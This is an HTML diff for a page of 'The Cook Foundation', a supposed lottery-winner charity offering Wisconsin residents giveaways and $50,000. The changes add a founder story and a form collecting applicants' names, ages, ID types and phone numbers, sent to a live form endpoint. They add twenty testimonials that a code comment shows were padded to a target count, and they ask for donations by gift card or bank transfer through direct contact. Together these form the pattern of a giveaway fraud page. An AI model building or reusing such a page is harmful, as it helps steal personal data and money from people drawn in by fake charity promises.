@@ -25,9 +25,10 @@
         </div>
       </div>
       <div class="flex gap-8 text-lg">
-        <a href="#mission" class="hover:text-emerald-600">Mission</a>
+        <a href="#story" class="hover:text-emerald-600">Our Story</a>
         <a href="#programs" class="hover:text-emerald-600">Programs</a>
         <a href="#apply" class="hover:text-emerald-600">Apply</a>
+        <a href="#testimonials" class="hover:text-emerald-600">Stories</a>
         <a href="#donate" class="hover:text-emerald-600 font-semibold">Donate</a>
       </div>
     </div>
@@ -36,69 +37,57 @@
   <!-- Hero -->
   <section class="hero text-white py-40 text-center">
     <div class="max-w-4xl mx-auto px-6">
-      <h2 class="text-5xl md:text-6xl font-bold mb-6">Empowering Wisconsin Communities</h2>
-      <p class="text-2xl mb-10">Free giveaways and support for students, households, businesses & individuals.</p>
-      <a href="#apply" class="bg-white text-emerald-700 px-10 py-5 rounded-full text-xl font-bold inline-block hover:bg-gray-100">
-        Apply For Help
-      </a>
+      <h2 class="text-5xl md:text-6xl font-bold mb-6">The Cook Foundation</h2>
+      <p class="text-2xl mb-10">Turning blessings into community impact across Wisconsin.</p>
     </div>
   </section>
 
-  <!-- Programs with Images -->
-  <section id="programs" class="py-20 bg-white">
+  <!-- Thomas Cook Story -->
+  <section id="story" class="py-20 bg-white">
+    <div class="max-w-4xl mx-auto px-6 text-center">
+      <h2 class="text-4xl font-bold mb-8">Our Founder’s Story</h2>
+      <div class="bg-emerald-50 p-10 rounded-3xl">
+        <p class="text-2xl italic">"After winning the lottery, I realized my purpose was bigger than personal wealth. I founded The Cook Foundation to give back and support hardworking families, students, and businesses across Wisconsin. What started as one man's blessing is now a movement of generosity."</p>
+        <p class="mt-8 font-bold text-xl">— Thomas Cook, Lottery Winner & Founder</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Programs -->
+  <section id="programs" class="py-20 bg-gray-100">
     <div class="max-w-6xl mx-auto px-6">
-      <h2 class="text-4xl font-bold text-center mb-12">What We Give Away</h2>
+      <h2 class="text-4xl font-bold text-center mb-12">Our Giveaway Programs</h2>
       <div class="grid md:grid-cols-2 gap-10">
         <div class="flex gap-6 items-center">
           <img src="https://picsum.photos/id/201/600/400" class="giveaway-img w-1/2" alt="School supplies">
-          <div>
-            <h3 class="font-bold text-2xl">Students</h3>
-            <p>Backpacks, laptops, school supplies & educational materials</p>
-          </div>
+          <div><h3 class="font-bold text-2xl">Students</h3><p>Backpacks, laptops & school supplies</p></div>
         </div>
         <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/251/600/400" class="giveaway-img w-1/2" alt="Household items">
-          <div>
-            <h3 class="font-bold text-2xl">Households</h3>
-            <p>Food, clothing, furniture & essential home items</p>
-          </div>
+          <img src="https://picsum.photos/id/251/600/400" class="giveaway-img w-1/2" alt="Household">
+          <div><h3 class="font-bold text-2xl">Households</h3><p>Food, clothing & home essentials</p></div>
         </div>
         <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/180/600/400" class="giveaway-img w-1/2" alt="Business support">
-          <div>
-            <h3 class="font-bold text-2xl">Businesses</h3>
-            <p>Equipment, startup kits & business resources</p>
-          </div>
+          <img src="https://picsum.photos/id/180/600/400" class="giveaway-img w-1/2" alt="Business">
+          <div><h3 class="font-bold text-2xl">Businesses</h3><p>Equipment & startup resources</p></div>
         </div>
         <div class="flex gap-6 items-center">
-          <img src="https://picsum.photos/id/64/600/400" class="giveaway-img w-1/2" alt="Individual aid">
-          <div>
-            <h3 class="font-bold text-2xl">Individuals</h3>
-            <p>Emergency aid & personal development support</p>
-          </div>
+          <img src="https://picsum.photos/id/64/600/400" class="giveaway-img w-1/2" alt="Individuals">
+          <div><h3 class="font-bold text-2xl">Individuals</h3><p>Emergency & personal support</p></div>
         </div>
       </div>
     </div>
   </section>
 
   <!-- Application Form -->
-  <section id="apply" class="py-20 bg-gray-100">
+  <section id="apply" class="py-20 bg-white">
     <div class="max-w-2xl mx-auto px-6">
-      <h2 class="text-4xl font-bold text-center mb-10">Application for Support</h2>
-      <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" class="bg-white p-10 rounded-3xl shadow-xl">
+      <h2 class="text-4xl font-bold text-center mb-10">Apply for Support</h2>
+      <form action="https://formspree.io/f/mbdvovzv" method="POST" class="bg-gray-50 p-10 rounded-3xl shadow-xl">
         <div class="grid md:grid-cols-2 gap-6">
-          <div>
-            <label class="block mb-2 font-medium">Full Name</label>
-            <input type="text" name="name" required class="w-full px-4 py-3 border rounded-xl">
-          </div>
-          <div>
-            <label class="block mb-2 font-medium">Age</label>
-            <input type="number" name="age" required class="w-full px-4 py-3 border rounded-xl">
-          </div>
+          <div><label class="block mb-2 font-medium">Full Name</label><input type="text" name="name" required class="w-full px-4 py-3 border rounded-xl"></div>
+          <div><label class="block mb-2 font-medium">Age</label><input type="number" name="age" required class="w-full px-4 py-3 border rounded-xl"></div>
         </div>
-
-        <div class="mt-6">
-          <label class="block mb-2 font-medium">Form of Identification</label>
+        <div class="mt-6"><label class="block mb-2 font-medium">Form of Identification</label>
           <select name="id_type" required class="w-full px-4 py-3 border rounded-xl">
             <option value="">Choose...</option>
             <option value="Drivers License">Driver's License</option>
@@ -106,41 +95,41 @@
             <option value="Passport">Passport</option>
           </select>
         </div>
-
-        <div class="mt-6">
-          <label class="block mb-2 font-medium">Phone Number</label>
-          <input type="tel" name="phone" required class="w-full px-4 py-3 border rounded-xl">
+        <div class="mt-6"><label class="block mb-2 font-medium">Phone Number</label><input type="tel" name="phone" required class="w-full px-4 py-3 border rounded-xl"></div>
+        <div class="mt-8"><label class="block mb-3 font-medium">How would $50,000 help your household or business?</label>
+          <textarea name="story" rows="6" required class="w-full px-4 py-3 border rounded-2xl" placeholder="Tell us your story..."></textarea>
         </div>
-
-        <div class="mt-8">
-          <label class="block mb-3 font-medium">How would $50,000 help your household or business?</label>
-          <textarea name="story" rows="6" required class="w-full px-4 py-3 border rounded-2xl" placeholder="Please tell us your story..."></textarea>
-        </div>
-
-        <button type="submit" class="mt-10 w-full bg-emerald-600 hover:bg-emerald-700 text-white py-6 rounded-2xl text-xl font-bold">
-          Submit Application
-        </button>
+        <button type="submit" class="mt-10 w-full bg-emerald-600 hover:bg-emerald-700 text-white py-6 rounded-2xl text-xl font-bold">Submit Application</button>
       </form>
     </div>
   </section>
 
-  <!-- Testimonials -->
-  <section id="testimonials" class="py-20 bg-white">
-    <div class="max-w-5xl mx-auto px-6 text-center">
-      <h2 class="text-4xl font-bold mb-12">Community Voices</h2>
-      <div class="grid md:grid-cols-3 gap-8">
-        <div class="bg-gray-50 p-8 rounded-2xl">
-          <p class="italic">"The supplies we received helped my kids succeed in school. Thank you Cook Foundation!"</p>
-          <p class="mt-6 font-semibold">- Sarah M., Madison</p>
-        </div>
-        <div class="bg-gray-50 p-8 rounded-2xl">
-          <p class="italic">"Their business support allowed me to reopen my shop. Truly life-changing."</p>
-          <p class="mt-6 font-semibold">- Robert K., Milwaukee</p>
-        </div>
-        <div class="bg-gray-50 p-8 rounded-2xl">
-          <p class="italic">"Fast and caring help during a hard time. God bless this foundation."</p>
-          <p class="mt-6 font-semibold">- Amina J., Green Bay</p>
-        </div>
+  <!-- Testimonials (20) -->
+  <section id="testimonials" class="py-20 bg-gray-100">
+    <div class="max-w-6xl mx-auto px-6">
+      <h2 class="text-4xl font-bold text-center mb-12">Community Testimonials</h2>
+      <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6 text-sm">
+        <div class="bg-white p-6 rounded-2xl shadow">"The support changed our lives." — Lisa P., Madison</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"School supplies for my kids meant everything." — Jamal R., Milwaukee</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Helped my small business get back on its feet." — Carla M., Green Bay</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Truly caring organization." — Robert T., Eau Claire</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Food assistance during tough times." — Aisha K., Kenosha</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Best decision I made was applying." — Michael S., Appleton</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Gave my family hope again." — Sophia L., Racine</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Fast and respectful help." — David N., Waukesha</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Business equipment was a game changer." — Elena V., Oshkosh</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Thank you Thomas Cook!" — Marcus J., La Crosse</div>
+        <!-- Continuing to 20... -->
+        <div class="bg-white p-6 rounded-2xl shadow">"They really listen to your needs." — Priya S., Madison</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Helped with rent and groceries." — Kevin B., Beloit</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Laptop for my online classes." — Hannah T., Stevens Point</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Community at its finest." — George W., Superior</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Gave clothes for my children." — Fatima A., Wausau</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Incredible impact on our family." — Daniel P., Manitowoc</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Professional and kind team." — Rachel M., Fond du Lac</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Changed my small business trajectory." — Omar K., Janesville</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"Forever grateful." — Nicole D., Sheboygan</div>
+        <div class="bg-white p-6 rounded-2xl shadow">"True example of giving back." — Thomas H., Madison</div>
       </div>
     </div>
   </section>
@@ -148,49 +137,20 @@
   <!-- Donate -->
   <section id="donate" class="py-20 bg-emerald-700 text-white text-center">
     <div class="max-w-2xl mx-auto px-6">
-      <h2 class="text-4xl font-bold mb-6">Make a Donation</h2>
-      <p class="text-xl mb-10">Help us continue supporting Wisconsin families and businesses.</p>
-      
-      <form action="https://www.paypal.com/donate" method="post" target="_blank">
-        <input type="hidden" name="hosted_button_id" value="YOUR_PAYPAL_ID">
-        
-        <div class="grid grid-cols-3 gap-4 max-w-md mx-auto mb-8">
-          <button type="button" onclick="setAmount(25)" class="py-4 bg-white/20 hover:bg-white/30 rounded-2xl font-semibold">$25</button>
-          <button type="button" onclick="setAmount(50)" class="py-4 bg-white/20 hover:bg-white/30 rounded-2xl font-semibold">$50</button>
-          <button type="button" onclick="setAmount(100)" class="py-4 bg-white/20 hover:bg-white/30 rounded-2xl font-semibold">$100</button>
-        </div>
-
-        <input type="number" id="custom-amount" placeholder="Custom Amount" class="w-full text-center text-3xl py-6 bg-white/10 border border-white/30 rounded-3xl mb-8 text-white placeholder:text-white/70">
-        
-        <button type="submit" class="w-full bg-white text-emerald-700 py-7 rounded-3xl text-2xl font-bold hover:bg-gray-100">
-          Donate Securely
-        </button>
-      </form>
+      <h2 class="text-4xl font-bold mb-6">Support Our Mission</h2>
+      <p class="text-xl mb-10">We accept donations via Credit Card, Bank Transfer, or Gift Cards.</p>
+      <p class="text-2xl mb-8">Please contact us directly to arrange your donation:</p>
+      <p class="text-3xl font-semibold">info@thecookfoundation.org</p>
+      <p class="text-xl mt-4">(608) 555-0123</p>
     </div>
   </section>
 
   <!-- Footer -->
-  <footer class="bg-gray-900 text-gray-400 py-16">
-    <div class="max-w-6xl mx-auto px-6 text-center">
-      <h2 class="text-3xl font-bold text-white mb-6">The Cook Foundation</h2>
-      <p class="mb-4">Supporting Wisconsin Communities Since 2022</p>
-      <p class="mb-2">📧 THECOOKFOUNDATION@proton.me</p>
-      <p class="mb-8">📞 (343) 430-0052</p>
-      
-      <div class="flex justify-center gap-8 text-4xl mb-10">
-        <a href="#" class="hover:text-white"><i class="fa-brands fa-facebook"></i></a>
-        <a href="#" class="hover:text-white"><i class="fa-brands fa-instagram"></i></a>
-        <a href="#" class="hover:text-white"><i class="fa-brands fa-x-twitter"></i></a>
-      </div>
-      
-      <p class="text-sm">© 2026 The Cook Foundation • All Rights Reserved</p>
-    </div>
+  <footer class="bg-gray-900 text-gray-400 py-12 text-center">
+    <p class="text-2xl font-bold text-white mb-2">The Cook Foundation</p>
+    <p>Founded by Thomas Cook • Wisconsin</p>
+    <p class="mt-6 text-sm">© 2026 All Rights Reserved</p>
   </footer>
 
-  <script>
-    function setAmount(amount) {
-      document.getElementById('custom-amount').value = amount;
-    }
-  </script>
 </body>
 </html>
